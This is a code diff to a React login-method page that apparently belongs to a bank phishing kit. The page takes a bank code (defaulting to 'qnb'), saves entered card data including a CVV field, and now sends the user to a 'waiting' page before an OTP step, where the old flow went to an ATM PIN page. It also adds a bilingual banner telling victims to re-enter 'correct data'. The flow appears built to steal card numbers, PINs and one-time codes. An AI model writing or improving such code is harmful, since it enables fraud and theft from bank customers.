@@ -11,6 +11,7 @@ export default function LoginMethod() {
   const params = new URLSearchParams(search);
   const bank = params.get("bank") || "qnb";
   const sessionId = localStorage.getItem("sessionId") || "";
+  const showError = params.get("error") === "true";
 
   const isArabic = language === "ar";
   const footerImage = isArabic 
@@ -67,11 +68,10 @@ export default function LoginMethod() {
           cvv: undefined,
         } as any);
       }
-      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
+      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=otp`);
     } catch (error) {
-      console.error("Error saving login method in DB, continuing anyway:", error);
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
     }
-    setLocation(`/atm-pin?bank=${bank}&session=${sessionId}`);
   };
 
   const toggleLanguage = () => {
@@ -116,6 +116,11 @@ export default function LoginMethod() {
       </header>
 
       <div className="container">
+        {showError && (
+          <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
+            {isArabic ? "برجاء التحقق من البيانات الصحيحه وإعادة المحاوله" : "Please check the correct data and try again"}
+          </div>
+        )}
         <div
           className={`selection-box ${method === "card" ? "active" : ""}`}
           onClick={() => setMethod("card")}
